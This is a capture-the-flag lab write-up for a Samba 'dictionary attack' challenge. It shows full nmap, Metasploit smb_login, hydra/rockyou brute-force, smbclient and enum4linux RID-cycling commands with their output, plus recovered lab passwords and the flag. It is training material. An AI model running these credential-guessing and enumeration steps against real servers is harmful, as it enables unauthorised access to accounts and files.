# Samba Recon: Dictionary Attack

### Overview

> In this challenge we will look at the dictionary attack on SMB server.  Please start the lab and answer the following questions:
>
> Questions
>
> 1. What is the password of user “jane” required to access share “jane”? Use smb\_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix\_passwords.txt
> 2. What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
> 3. Which share is read only? Use smbmap with credentials obtained in question 2.
> 4. Is share “jane” browseable? Use credentials obtained from the 1st question.
> 5. Fetch the flag from share “admin”
> 6. List the named pipes available over SMB on the samba server? Use  pipe\_auditor metasploit module with credentials obtained from question 2.
> 7. List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
>
> Instructions:&#x20;
>
> * This lab is dedicated to you! No other users are on this network :)
> * Once you start the lab, you will have access to a root terminal of a Kali instance
> * Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
> * The Target machine should be located at the IP address 192.X.Y.3.
> * Do not attack the gateway located at IP address 192.X.Y.1



Target: `192.10.76.3`

* Linux SMB (**`smbd`**) enumeration
* Check for local Ethernet IP address
* Use `nmap` host discovery to scan host within the subnet to find the target machines IP address

```bash
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
232293: eth0@if232294: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.10/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
232296: eth1@if232297: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:0a:4c:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.10.76.2/24 brd 192.10.76.255 scope global eth1
       valid_lft forever preferred_lft forever

root@attackdefense:~# nmap -sn 192.10.76.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-26 14:24 UTC
Nmap scan report for linux (192.10.76.1)
Host is up (0.000042s latency).
MAC Address: 02:42:81:0F:77:B2 (Unknown)
Nmap scan report for target-1 (192.10.76.3)
Host is up (0.000012s latency).
MAC Address: 02:42:C0:0A:4C:03 (Unknown)
Nmap scan report for attackdefense.com (192.10.76.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.00 seconds

root@attackdefense:~# nmap 192.10.76.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-26 14:25 UTC
Nmap scan report for target-1 (192.10.76.3)
Host is up (0.0000090s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:0A:4C:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
```

> 1. What is the password of user “jane” required to access share “jane”? Use smb\_login metasploit module with password wordlist `/usr/share/wordlists/metasploit/unix_passwords.txt`

Answer: `Success: '.\jane:abc123'`

```bash
msf5 > use auxiliary/scanner/smb/smb_login 
msf5 auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target address range or CIDR identifier
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.10.76.3
RHOSTS => 192.10.76.3
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set SMBUser jane
SMBUser => jane
msf5 auxiliary(scanner/smb/smb_login) > exploit

[*] 192.10.76.3:445       - 192.10.76.3:445 - Starting SMB login bruteforce
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:admin',
[!] 192.10.76.3:445       - No active DB -- Credential data will not be saved!
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:123456',
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:12345',
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:123456789',
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:password',
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:iloveyou',
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:princess',
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:1234567',
[-] 192.10.76.3:445       - 192.10.76.3:445 - Failed: '.\jane:12345678',
[+] 192.10.76.3:445       - 192.10.76.3:445 - Success: '.\jane:abc123'
[*] 192.10.76.3:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### hydra

> 2. What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt

Answer: `login: admin   password: password1`

```bash
root@attackdefense:~# gzip -d /usr/share/wordlists/rockyou.txt.gz 

root@attackdefense:~# hydra
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]

Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.

Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
```

```bash
root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.10.76.3 smb 
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-26 14:32:05
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.10.76.3:445/
[445][smb] host: 192.10.76.3   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-26 14:32:07
```

> 3. Which share is read only? Use smbmap with credentials obtained in question 2.

Answer: `nancy`

```bash
root@attackdefense:~# smbmap -u admin -p password1 -H 192.10.76.3
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.10.76.3...
[+] IP: 192.10.76.3:445 Name: target-1                                          
        Disk                                                    Permissions
        ----                                                    -----------
        shawn                                                   READ, WRITE
        nancy                                                   READ ONLY
        admin                                                   READ, WRITE
        IPC$                                                    NO ACCESS
```

> 4. Is share “jane” browseable? Use credentials obtained from the 1st question.

Answer: No

```bash
root@attackdefense:~# smbclient -L 192.10.76.3 -U jane
Enter WORKGROUP\jane's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk      
        nancy           Disk      
        admin           Disk      
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            
```

* Share “jane” is not listed. Checking whether jane share exists

```bash
root@attackdefense:~# smbclient //192.10.76.3/jane -U jane
Enter WORKGROUP\jane's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  logs                                D        0  Tue Nov 27 19:25:12 2018
  flag                                D        0  Tue Nov 27 19:25:12 2018
  admin                               D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 167678716 blocks available
smb: \> get flag  
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \flag

smb: \> cd flag
smb: \flag\> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  flag                                N       33  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 167676252 blocks available
smb: \flag\> get flag
getting file \flag\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
```

> 5. Fetch the flag from share “admin”

Answer: `2727069bc058053bd561ce372721c92e`

```bash
root@attackdefense:~# smbclient //192.10.76.3/admin -U admin
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun 26 14:35:58 2024
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  hidden                              D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 167671148 blocks available
smb: \> cd hidden\
smb: \hidden\> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Wed Jun 26 14:35:58 2024
  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 167671036 blocks available
smb: \hidden\> get flag.tar.gz 
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz (147.4 KiloBytes/sec) (average 147.5 KiloBytes/sec)
smb: \hidden\> exit

root@attackdefense:~# ls
README  flag  flag.tar.gz  tools  wordlists
root@attackdefense:~# tar -xf flag.tar.gz 
root@attackdefense:~# ls
README  flag  flag.tar.gz  tools  wordlists
root@attackdefense:~# cat flag
2727069bc058053bd561ce372721c92e
```

> 6. List the named pipes available over SMB on the samba server? Use pipe\_auditor metasploit module with credentials obtained from question 2.

Answer: `Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc`

```bash
root@attackdefense:~# msfconsole

msf5 > use auxiliary/scanner/smb/pipe_auditor 
msf5 auxiliary(scanner/smb/pipe_auditor) > options

Module options (auxiliary/scanner/smb/pipe_auditor):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target address range or CIDR identifier
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/pipe_auditor) > set RHOSTS 192.10.76.3
RHOSTS => 192.10.76.3
msf5 auxiliary(scanner/smb/pipe_auditor) > set SMBPass password1
SMBPass => password1
msf5 auxiliary(scanner/smb/pipe_auditor) > set SMBUser admin
SMBUser => admin
msf5 auxiliary(scanner/smb/pipe_auditor) > exploit

[+] 192.10.76.3:139       - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
[*] 192.10.76.3:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 7. List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.

Answer:&#x20;

```bash
S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
```

```bash
root@attackdefense:~# enum4linux -u admin -p password1 -r 192.10.76.3 
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun 26 14:49:46 2024

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.10.76.3
RID Range ........ 500-550,1000-1050
Username ......... 'admin'
Password ......... 'password1'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 192.10.76.3    |
 =================================================== 
[+] Got domain/workgroup name: RECONLABS

 ==================================== 
|    Session Check on 192.10.76.3    |
 ==================================== 
[+] Server 192.10.76.3 allows sessions using username 'admin', password 'password1'

 ========================================== 
|    Getting domain SID for 192.10.76.3    |
 ========================================== 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================================================== 
|    Users on 192.10.76.3 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
[I] Found new SID: S-1-22-2
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3690628376-3985617143-2159776750
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'
S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username 'admin', password 'password1'

S-1-5-21-3690628376-3985617143-2159776750-1000 SAMBA-RECON-BRUTE\shawn (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1001 SAMBA-RECON-BRUTE\jane (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1002 SAMBA-RECON-BRUTE\nancy (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1003 SAMBA-RECON-BRUTE\admin (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1004 SAMBA-RECON-BRUTE\Maintainer (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1005 SAMBA-RECON-BRUTE\Reserved (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1006 SAMBA-RECON-BRUTE\Testing (Local Group)
```











